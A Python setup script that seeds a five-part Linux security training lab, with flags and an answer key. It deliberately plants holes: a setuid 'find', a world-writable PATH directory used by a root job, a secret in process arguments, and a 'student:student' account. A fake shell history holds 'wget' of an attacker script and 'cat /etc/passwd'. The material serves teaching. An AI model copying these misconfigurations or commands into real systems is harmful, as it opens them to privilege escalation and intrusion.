#!/usr/bin/env python3
"""Seed the hands-on lab environment.

Safe to re-run: it wipes and rebuilds /srv/lab. Your answers in ./answers/
are never touched.

Usage:  ./setup            (all labs)
        ./setup 1 3        (only those labs)
"""
import json
import os
import random
import shutil
import subprocess
import sys
import time
from pathlib import Path

LAB = Path("/srv/lab")
GRADE = LAB / ".grading"
COURSE = Path(__file__).resolve().parent.parent
rnd = random.Random(20261027)

FLAG1 = "FLAG{l1nux_f1l3syst3m_n4v1g4t10n}"
P1, P2, P3 = "FLAG{l1nux_", "f1l3syst3m_", "n4v1g4t10n}"
assert P1 + P2 + P3 == FLAG1

FLAG2 = "FLAG{l0gs_d0nt_l13}"
FLAG3 = "FLAG{gtf0b1ns_4r3_ch34t_sh33ts}"
FLAG4 = "FLAG{s3cr3ts_1n_4rgv}"
FLAG5 = "FLAG{p4th_h1j4ck_0wns_r00t}"

answers = {}


def run(*cmd, **kw):
    return subprocess.run(cmd, check=True, capture_output=True, text=True, **kw)


def ensure_user():
    import pwd

    try:
        pwd.getpwnam("student")
    except KeyError:
        run("useradd", "-m", "-s", "/bin/bash", "student")
        subprocess.run(["chpasswd"], input="student:student", text=True, check=True)
        print("  created user 'student' (password: student)")


def kill_group(marker):
    subprocess.run(["pkill", "-f", marker], check=False)


# --------------------------------------------------------------------------
# Lab 01 — filesystem, hidden files, find, symlinks vs hard links
# --------------------------------------------------------------------------
def lab01():
    d = LAB / "01"
    shutil.rmtree(d, ignore_errors=True)
    (d / "inbox" / ".ssh").mkdir(parents=True)
    (d / "inbox" / "archive" / "2024").mkdir(parents=True)
    (d / "inbox" / "archive" / "2025").mkdir(parents=True)
    (d / "shared").mkdir(parents=True)
    (d / ".trash").mkdir(parents=True)

    (d / "inbox" / "notes.txt").write_text(
        "Remember: the audit is on Friday.\n"
        "Ask ops about the old backup server.\n"
    )
    (d / "inbox" / "todo.md").write_text("- rotate keys\n- review firewall rules\n")

    # Flag part 1: hidden directory, disguised as a comment in known_hosts
    (d / "inbox" / ".ssh" / "known_hosts").write_text(
        "backup01 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH0fake\n"
        "# flag part 1: " + P1 + "\n"
    )

    # Flag part 2: filename begins with '-' (needs ./ or -- to cat)
    (d / "inbox" / "archive" / "2024" / "-notes from 2025.txt").write_text(
        "carried over from last year\n# flag part 2: " + P2 + "\n"
    )

    # Flag part 3: hidden directory at the top of the tree
    (d / ".trash" / "part3.txt").write_text("# flag part 3: " + P3 + "\n")

    # Decoys so that listing != understanding
    words = ["invoice", "backup", "report", "schema", "dump", "export",
             "contract", "summary", "config", "cache"]
    for year, months in [("2024", range(1, 13)), ("2025", range(1, 7))]:
        for m in months:
            sub = d / "inbox" / "archive" / year / f"{m:02d}"
            sub.mkdir(parents=True, exist_ok=True)
            for i in range(rnd.randint(3, 6)):
                name = f"{rnd.choice(words)}_{rnd.randint(1000, 9999)}.log"
                (sub / name).write_text(
                    f"entry {i} status=ok bytes={rnd.randint(1, 9999)}\n"
                )

    # A file with spaces, a symlink, and a hard link to notes.txt
    (d / "shared" / "my notes.txt").write_text("nothing interesting here\n")
    (d / "shared" / "data.csv").write_text("id,name\n1,alice\n2,bob\n")
    os.symlink("../inbox/notes.txt", d / "shared" / "link")
    os.link(d / "inbox" / "notes.txt", d / "shared" / "notes-hardlink")

    answers["01"] = {
        "flag": FLAG1,
        "link_target": "../inbox/notes.txt",
        "hardlink": "/srv/lab/01/shared/notes-hardlink",
    }


# --------------------------------------------------------------------------
# Lab 02 — log analysis: grep, awk, sort, uniq, base64
# --------------------------------------------------------------------------
def lab02():
    d = LAB / "02"
    shutil.rmtree(d, ignore_errors=True)
    (d / "backup" / "home" / "svc_backup" / ".ssh").mkdir(parents=True)
    (d / "backup" / "home" / "jdoe").mkdir(parents=True)

    attacker = "198.51.100.23"
    scan_paths = ["/admin.php", "/wp-login.php", "/.env", "/phpmyadmin/",
                  "/backup.zip", "/shell.php", "/config.php.bak", "/.git/config",
                  "/cgi-bin/test.cgi", "/server-status"]
    normal_paths = ["/", "/index.html", "/about", "/assets/app.js",
                    "/api/v1/items", "/login", "/favicon.ico", "/contact",
                    "/pricing", "/blog/post-42"]
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "curl/8.5.0",
        "python-requests/2.31.0",
    ]
    normal_ips = [f"192.0.2.{i}" for i in range(10, 40)] + [
        "203.0.113.7", "203.0.113.19", "172.16.5.4", "10.0.0.12",
    ]

    lines = []
    ts = 0
    rnd.shuffle(normal_ips)

    def stamp(offset):
        t = time.gmtime(1773316800 + offset)  # 2026-03-12
        return time.strftime("%d/%b/%Y:%H:%M:%S +0000", t)

    for _ in range(3600):
        ip = rnd.choice(normal_ips)
        path = rnd.choice(normal_paths)
        status = rnd.choices([200, 301, 304, 404, 500], [0.72, 0.1, 0.1, 0.06, 0.02])[0]
        lines.append(
            f'{ip} - - [{stamp(ts)}] "GET {path} HTTP/1.1" {status} '
            f'{rnd.randint(200, 8000)} "-" "{rnd.choice(uas)}"'
        )
        ts += rnd.randint(0, 2)

    attacker_404 = 0
    for i in range(214):
        path = rnd.choice(scan_paths)
        lines.append(
            f'{attacker} - - [{stamp(ts)}] "GET {path} HTTP/1.1" 404 512 "-" '
            f'"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"'
        )
        attacker_404 += 1
        ts += rnd.randint(0, 3)
    for i in range(40):
        path = rnd.choice(scan_paths)
        lines.append(
            f'{attacker} - - [{stamp(ts)}] "POST {path} HTTP/1.1" 404 512 "-" "curl/8.5.0"'
        )
        attacker_404 += 1
        ts += 1

    runner = "203.0.113.19"
    for i in range(37):
        lines.append(
            f'{runner} - - [{stamp(ts)}] "GET {rnd.choice(scan_paths)} HTTP/1.1" 404 512 "-" "curl/8.5.0"'
        )
        ts += 1

    rnd.shuffle(lines)
    (d / "access.log").write_text("\n".join(lines) + "\n")

    auth = []
    for i in range(61):
        auth.append(
            f"Mar 12 14:0{i % 10}:{i:02d} web01 sshd[{4100 + i}]: Failed password for "
            f"svc_backup from {attacker} port {40000 + i} ssh2"
        )
    for user, ip, n in [("oracle", "203.0.113.9", 12), ("test", "203.0.113.44", 8),
                        ("admin", "172.16.5.4", 3)]:
        for i in range(n):
            auth.append(
                f"Mar 12 13:{10 + i:02d}:11 web01 sshd[{5000 + i}]: Failed password for "
                f"invalid user {user} from {ip} port {51000 + i} ssh2"
            )
    auth.append(
        f"Mar 12 14:20:01 web01 sshd[5501]: Accepted password for svc_backup from "
        f"{attacker} port 41022 ssh2"
    )
    for user in ["jdoe", "opsbot", "jdoe"]:
        auth.append(
            f"Mar 12 15:0{rnd.randint(1, 9)}:33 web01 sshd[{5600 + rnd.randint(1, 90)}]: "
            f"Accepted password for {user} from 10.0.0.{rnd.randint(2, 50)} port 33022 ssh2"
        )
    auth.append("Mar 12 15:44:02 web01 sshd[5901]: Received disconnect from 10.0.0.7: 11: disconnected by user")
    rnd.shuffle(auth)
    (d / "auth.log").write_text("\n".join(auth) + "\n")

    import base64

    b64 = base64.b64encode(FLAG2.encode()).decode()
    decoy = base64.b64encode(b"hello from the backup server").decode()
    (d / "backup" / "home" / "svc_backup" / ".bash_history").write_text(
        "ls -la\n"
        "cd /var/backups\n"
        f"echo {decoy} | base64 -d\n"
        "wget http://198.51.100.23/tools/loot.sh\n"
        "cat /etc/passwd\n"
        f"echo {b64} | base64 -d > /tmp/.stash\n"
        "history -c\n"
    )
    (d / "backup" / "home" / "svc_backup" / ".ssh" / "id_ed25519").write_text(
        "-----BEGIN OPENSSH PRIVATE KEY-----\nnot-a-real-key-just-a-lab\n"
        "-----END OPENSSH PRIVATE KEY-----\n"
    )

    answers["02"] = {"ip": attacker, "count": attacker_404, "user": "svc_backup", "flag": FLAG2}


# --------------------------------------------------------------------------
# Lab 03 — permissions, SUID, a real over-privileged binary
# --------------------------------------------------------------------------
def lab03():
    d = LAB / "03"
    shutil.rmtree(d, ignore_errors=True)
    (d / "secrets").mkdir(parents=True)
    (d / "bin").mkdir(parents=True)
    (d / "public" / "uploads").mkdir(parents=True)
    (d / "backup").mkdir(parents=True)

    (d / "secrets" / "flag.txt").write_text(FLAG3 + "\n")
    (d / "secrets" / "db_password.txt").write_text("prod-db:d0-not-reuse-me\n")
    os.chmod(d / "secrets", 0o700)
    os.chmod(d / "secrets" / "flag.txt", 0o000)
    os.chmod(d / "secrets" / "db_password.txt", 0o600)

    # A perfectly legitimate tool, given a perfectly illegitimate permission bit.
    shutil.copy("/usr/bin/find", d / "bin" / "find")
    os.chmod(d / "bin" / "find", 0o4755)

    # Same bytes, no setuid bit. Copying a file does not copy privilege.
    shutil.copy("/usr/bin/find", d / "bin" / "find.bak")
    os.chmod(d / "bin" / "find.bak", 0o755)

    (d / "public" / "readme.txt").write_text("upload your files here\n")
    os.chmod(d / "public" / "readme.txt", 0o666)
    (d / "public" / "uploads" / "keep.txt").write_text("shared drop box\n")
    os.chmod(d / "public" / "uploads", 0o777)
    (d / "backup" / "nightly.tar.gz").write_text("not a real archive\n")
    os.chmod(d / "backup" / "nightly.tar.gz", 0o666)
    os.chmod(d / "backup", 0o777)

    answers["03"] = {"flag": FLAG3, "suid_path": "/srv/lab/03/bin/find"}


# --------------------------------------------------------------------------
# Lab 04 — processes, /proc, signals
# --------------------------------------------------------------------------
AGENT = "/srv/lab/04/.svc/agent.py"


def lab04():
    d = LAB / "04"
    shutil.rmtree(d, ignore_errors=True)
    (d / ".svc").mkdir(parents=True)
    agent = d / ".svc" / "agent.py"
    agent.write_text(
        "#!/usr/bin/env python3\n"
        "import argparse, os, time\n"
        "p = argparse.ArgumentParser()\n"
        "p.add_argument('--token')\n"
        "a = p.parse_args()\n"
        "with open('/srv/lab/04/.svc/agent.pid', 'w') as fh:\n"
        "    fh.write(str(os.getpid()))\n"
        "log = open('/srv/lab/04/.svc/beacon.log', 'a', buffering=1)\n"
        "n = 0\n"
        "while True:\n"
        "    n += 1\n"
        "    log.write(f'beat={n} len={len(a.token or \"\")}\\n')\n"
        "    time.sleep(5)\n"
    )
    (d / ".svc" / "beacon.log").write_text("")
    os.chmod(d / ".svc", 0o755)
    os.chmod(agent, 0o755)

    subprocess.run(["pkill", "-f", AGENT], check=False)
    time.sleep(0.3)
    cmd = (
        f"setsid nohup python3 {AGENT} --token '{FLAG4}' >/dev/null 2>&1 &"
    )
    subprocess.run(["su", "student", "-c", cmd], check=False)
    time.sleep(1.2)

    answers["04"] = {"flag": FLAG4, "log": "/srv/lab/04/.svc/beacon.log"}


# --------------------------------------------------------------------------
# Lab 05 — PATH hijack against a root-owned scheduled job
# --------------------------------------------------------------------------
BACKUP = "/srv/lab/05/backup.sh"


def lab05():
    d = LAB / "05"
    shutil.rmtree(d, ignore_errors=True)
    for sub in ("bin", "data", "backups", "out", "secrets"):
        (d / sub).mkdir(parents=True)

    (d / "data" / "customers.csv").write_text("id,name\n1,alice\n2,bob\n")
    (d / "data" / "notes.txt").write_text("nightly backup payload\n")
    (d / "secrets" / "flag.txt").write_text(FLAG5 + "\n")
    os.chmod(d / "secrets", 0o700)
    os.chmod(d / "secrets" / "flag.txt", 0o000)

    # The injected directory is first in PATH and writable by everyone.
    os.chmod(d / "bin", 0o777)

    (d / "backup.sh").write_text(
        "#!/bin/sh\n"
        "# nightly backup, runs as root\n"
        "PATH=/srv/lab/05/bin:/usr/local/bin:/usr/bin:/bin\n"
        "cd /srv/lab/05/data || exit 1\n"
        "tar czf /srv/lab/05/backups/latest.tgz . 2>/dev/null\n"
        "chmod -R a+rX /srv/lab/05/out\n"
    )
    os.chmod(d / "backup.sh", 0o755)
    os.chmod(d / "out", 0o755)

    subprocess.run(["pkill", "-f", "lab/05/backup.sh"], check=False)
    time.sleep(0.3)
    loop = (
        "setsid nohup bash -c 'while true; do /srv/lab/05/backup.sh; sleep 5; done' "
        ">/dev/null 2>&1 &"
    )
    subprocess.run(["bash", "-c", loop], check=False)

    answers["05"] = {"flag": FLAG5, "path_dir": "/srv/lab/05/bin"}


# --------------------------------------------------------------------------
def main():
    wanted = sys.argv[1:] or ["1", "2", "3", "4", "5"]
    LAB.mkdir(parents=True, exist_ok=True)
    GRADE.mkdir(parents=True, exist_ok=True)

    print("Setting up labs:", ", ".join(wanted))
    ensure_user()

    fns = {"1": lab01, "2": lab02, "3": lab03, "4": lab04, "5": lab05}
    for n in wanted:
        if n not in fns:
            sys.exit(f"unknown lab: {n}")
        fns[n]()
        print(f"  lab {n} seeded")

    gfile = GRADE / "expected.json"
    old = {}
    if gfile.exists():
        try:
            old = json.loads(gfile.read_text())
        except Exception:
            old = {}
    old.update(answers)
    gfile.write_text(json.dumps(old, indent=2))
    os.chmod(gfile, 0o600)
    os.chmod(GRADE, 0o700)

    (COURSE / "answers").mkdir(exist_ok=True)
    print("\nDone. Lab files are in /srv/lab/.  Start with:  ./check")


if __name__ == "__main__":
    main()
